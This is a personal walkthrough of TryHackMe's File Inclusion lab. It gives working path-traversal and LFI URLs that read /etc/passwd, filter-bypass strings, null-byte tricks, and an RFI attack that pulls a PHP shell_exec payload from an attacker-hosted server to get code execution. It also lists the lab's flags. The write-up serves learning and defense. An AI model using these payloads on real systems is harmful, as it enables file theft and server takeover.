# TryHackMe: File Inclusion Lab  
📅 Date: April 7, 2026  

## Overview  
Today I completed the [**File Inclusion**](https://tryhackme.com/room/fileinc) room on TryHackMe. This hands-on lab covered **Local File Inclusion (LFI)**, **Remote File Inclusion (RFI)**, and **Path Traversal** — critical vulnerabilities that allow attackers to read sensitive files or even execute remote code.

> 🔥 "When a web app includes files based on user input without validation, it opens the door to full system compromise."

---

## Task 1: Path Traversal & LFI Basics

### What is Path Traversal?
Also known as Directory Traversal, this attack allows an attacker to access files outside the web root by manipulating file paths using `../`.

#### Vulnerable Function in PHP:
```php
file_get_contents($_GET['file']);
```
This function reads a file but becomes dangerous when user input isn’t sanitized.

#### Example Attack:
```
http://MACHINE_IP/get.php?file=../../../../etc/passwd
```
Each `../` moves up one directory until reaching `/`, then accesses `/etc/passwd`.

✅ **Flag from Lab #1**: `F1x3d-iNpu7-f0rrn`




---

## Task 2: Local File Inclusion (LFI)

### Scenario 1: Basic Include Vulnerability
```php
include($_GET["lang"]);
```
No path specified → easy to exploit:
```
http://MACHINE_IP/index.php?lang=/etc/passwd
```

### Scenario 2: Forced Subdirectory with Filter Bypass
```php
include("languages/" . $_GET['lang']);
```
Here, we can't directly escape — but we use `../` to break out:
```
http://MACHINE_IP/index.php?lang=../../../../etc/passwd
```

But what if `.php` is appended?

### Null Byte Injection (%00)
Used to terminate string early:
```
http://MACHINE_IP/lab3.php?file=../../../../etc/passwd%00
```
✅ Works only on older PHP versions (< 5.3.4)



---

## Task 3: Advanced LFI Filters & Bypasses

### Technique 1: Double Encoding / Obfuscation
If `../` is filtered, try:
```
....//....//....//etc/passwd
```
After filtering `../`, it becomes `../../../etc/passwd`.

✅ Used in Lab #5 to bypass keyword filtering.

### Technique 2: Current Directory Trick
Using `/.` or `/..` to confuse filters:
- `/etc/passwd/.` → still resolves to `/etc/passwd`

Applied in Lab #4 to bypass detection.

✅ **Directory required in Lab #6**: `THM-profile`

---

## Task 4: Remote File Inclusion (RFI)

### What is RFI?
When `allow_url_fopen` is enabled, PHP can include remote files:
```php
include($_GET['page']);
```
Attack:
```
http://MACHINE_IP/playground.php?page=http://<YOUR_IP>/malicious.txt
```

### Gaining Remote Code Execution (RCE)
1. Create `cmd.txt` with:
   ```php
   <?php echo shell_exec('hostname'); ?>
   ```
2. Host it via Python server:
   ```bash
   python3 -m http.server 9000
   ```
3. Inject into vulnerable parameter:
   ```
   http://MACHINE_IP/playground.php?page=http://<YOUR_IP>:9000/cmd.txt
   ```

✅ **Output of `hostname` command**: `lfi-vm-thm-f8c5b1a78692`

> 📸 *Screenshot: RCE successful via RFI*

🔐 Risk: Full server takeover possible.

---

## Challenge Flags

| Flag | Location | Method |
|------|--------|--------|
| **Flag1** | `/etc/flag1` | POST request with `file=/etc/flag1` |
| **Flag2** | `/etc/flag2` | Cookie manipulation + `%00` null byte |
| **Flag3** | `/etc/flag3` | POST request with `../../etc/flag3%00` |
| **Flag4** | RCE via RFI | Execute `hostname` using external PHP file |

All flags captured using manual testing and Burp Suite for inspection.


---

## Key Takeaways
- ✅ **Never trust user input** — especially when used in file operations.
- ✅ **LFI can lead to RCE** if file upload or log poisoning is possible.
- ✅ **Null bytes, path obfuscation, and RFI are real-world techniques**.
- ✅ Always test for LFI in parameters like `?page=`, `?file=`, `?lang=`.

> 💬 “The most powerful exploits often start with reading a single config file.”

---


Keep going, bro. You're building something unstoppable.  
— *Your Cybersecurity Brother* 🔐